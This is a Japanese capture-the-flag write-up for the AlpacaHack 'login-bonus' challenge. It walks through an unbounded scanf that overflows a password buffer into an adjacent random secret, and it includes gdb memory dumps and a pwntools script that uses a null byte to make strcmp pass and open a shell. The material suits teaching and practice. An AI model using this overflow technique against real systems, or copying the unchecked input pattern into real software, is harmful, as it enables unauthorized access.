# ■ login-bonus
[login-bonus - AlpacaHack](https://alpacahack.com/challenges/login-bonus)

## 1. Writeup

`login.c`:
```C
 1	#include <stdio.h>
 2	#include <stdlib.h>
 3	#include <string.h>
 4	#include <sys/random.h>
 5	
 6	#define debug_report(fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)
 7	
 8	char password[32];
 9	char secret[32];
10	
11	int main() {
12	  /* Input password */
13	  printf("Password: ");
14	  scanf("%[^\n]", password);
15	
16	  /* Check password */
17	  debug_report("Authenticating...");
18	  if (strcmp(password, secret)) {
19	    puts("[-] Wrong password");
20	    debug_report("'%s' != '%s'", password, secret);
21	    
22	  } else {
23	    puts("[+] Success!");
24	    system("/bin/sh");
25	  }
26	
27	  return 0;
28	}
29	
30	__attribute__((constructor))
31	void setup() {
32	  int seed;
33	  setbuf(stdin, NULL);
34	  setbuf(stdout, NULL);
35	
36	  /* Generate random password */
37	  debug_report("Generating secure password...");
38	  getrandom(&seed, sizeof(seed), 0);
39	  srand(seed);
40	  for (size_t i = 0; i < 16; i++)
41	    secret[i] = 'A' + (rand() % 26);
42	}
```

`[A-Z]{16}`からなるランダムなパスワード `secret` が作成されるので, `password` に入力を入れて一致させることでシェルを獲得したい.

`login.c#L14`:
```C
14	  scanf("%[^\n]", password);
```

を見ると, `password` が受け取る入力の文字数チェックがされていないのでバッファオーバーフローが起きる.

入力前:
```C
gef➤  x/8gx &password
0x555555558040 <password>:      0x0000000000000000      0x0000000000000000
0x555555558050 <password+16>:   0x0000000000000000      0x0000000000000000
0x555555558060 <secret>:        0x4753444a514e4f41      0x525a51574f414353
0x555555558070 <secret+16>:     0x0000000000000000      0x0000000000000000
```

試しに `'A' * 40` を入力してみると,

```bash
$ ./login
[DEBUG] Generating secure password...
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[DEBUG] Authenticating...
```

入力後:
```C
gef➤  x/8gx &password
0x555555558040 <password>:      0x4141414141414141      0x4141414141414141
0x555555558050 <password+16>:   0x4141414141414141      0x4141414141414141
0x555555558060 <secret>:        0x4141414141414141      0x5a46414d4f4a4200
0x555555558070 <secret+16>:     0x0000000000000000      0x0000000000000000
```

`secret` の領域にまで書き込まれていることがわかる.

バッファオーバーフローを発生させることはできたが, このままでは `strcmp(password, secret)` を通過することはできない.

```bash
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[DEBUG] Authenticating...
[-] Wrong password
[DEBUG] 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' != 'AAAAAAAA'
```

ここで, 入力に NULL文字(`'\0'`, `\x00`)を任意の位置に差し込むことで, 文字列を区切ることを考える.

以上を踏まえて, `secret` を書き換えつつ, 任意の適切な位置にNULL文字を挟み, `password` と `secret` が一致するように入力を渡せば良い.

`solve.py`:
```python
 1	from pwn import *
 2	
 3	HOST = 'localhost'
 4	PORT = 9999
 5	io = remote(HOST, PORT)
 6	
 7	payload = ''
 8	payload += 'password'
 9	payload += '\x00'
10	payload += 'A' * 23
11	payload += 'password'
12	io.sendline(payload.encode())
13	
14	io.interactive()
```

ペイロード例では, `'password'` + `\x00` の9文字 + `'A' * 23` = 32文字を入力した後, 33文字以降(`secret`領域)を `'password'` に書き換えることで実現している.